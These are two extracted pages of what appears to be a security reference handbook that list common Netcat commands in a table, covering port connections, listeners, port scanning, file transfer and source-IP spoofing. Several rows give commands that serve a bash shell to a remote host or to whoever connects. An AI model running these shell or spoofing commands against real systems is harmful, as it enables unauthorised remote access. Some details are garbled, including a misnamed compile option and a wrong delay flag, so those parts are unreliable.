- pgno: 42
  md: '# RC 20 Reference Center


    # USEFUL NETCAT COMMANDS


    Netcat is a command-line tool that reads and writes data across networks using
    the TCP and UDP protocols. It is known as the “network Swiss army knife” because
    of the many different functions it can perform. The following table provides a
    quick usage guide for the most useful Netcat commands.


    > Netcat uses the TCP protocol by default. The -u flag can be used with many of
    the commands in the following table in order to make Netcat use UDP instead.


    | Description | Command |

    | --- | --- |

    | Connect to a port on a remote host | nc remote_host <port> |

    | Connect to multiple ports on a remote host | nc remote_host <port>...<port><br>For
    example:<br>nc www.somecompanyansexample.com 21 25 80 |

    | Listen on a port for incoming connections | nc -v -l -p <port> |

    | Connect to remote host and serve a bash shell | nc remote_ip <port> -e /bin/bash<br>Note
    that Netcat does not support the -e flag by default. To make Netcat support the
    -e flag, it must be re-compiled with the DPAGING_SECURITY_HOLE option |

    | Listen on a port and serve a bash shell upon connect | nc -v -l -p <port> -e
    /bin/bash<br>Note that Netcat does not support the -e flag by default. To make
    Netcat support the -e flag, it must be re-compiled with the DPAGING_SECURITY_HOLE
    option |

    | Port scan a remote host | nc -v -z remote_host <port>-<port><br>Use the -l flag
    to set a delay interval:<br>nc -i <seconds> -v -z remote_host <port>-<port> |

    | Pipe command output to a netcat request | <command> | nc remote_host <port><br>For
    example:<br>echo "GET / HTTP/1.0<br>[enter]<br>[enter>" | nc www.somecompanyansexample.com
    80 |

    | Use source-routing to connect to a port on a remote host | nc -g <gateway> remote_host
    <port><br>Note: Up to eight high points may be specified using the -g flag. Use
    the -G flag to specify the source-routing pointer |'
  merge: -1
  img_proc: true
- pgno: 43
  md: '# Useful Netcat Commands


    | Description | Command |

    |---|---|

    | Spoof IP address | Use the -s flag to spoof the source IP address: nc -s spoofed_ip
    remote_host port This command will cause the remote host to respond back to the
    spoofed IP address. The -s flag can be used along with most of the commands presented
    in this table. |

    | Transfer a file | On the server host: nc -v -l -p <port> <file>

    On the client host: nc -v <server_host> <port> <file>

    It is also possible for the client host to listen on a port in order to receive
    a file. To do this, run the following command on the client host: nc -v -l -p
    <port> > file

    And run the following command on the server host: nc -v <client_host> <port> <
    file |'
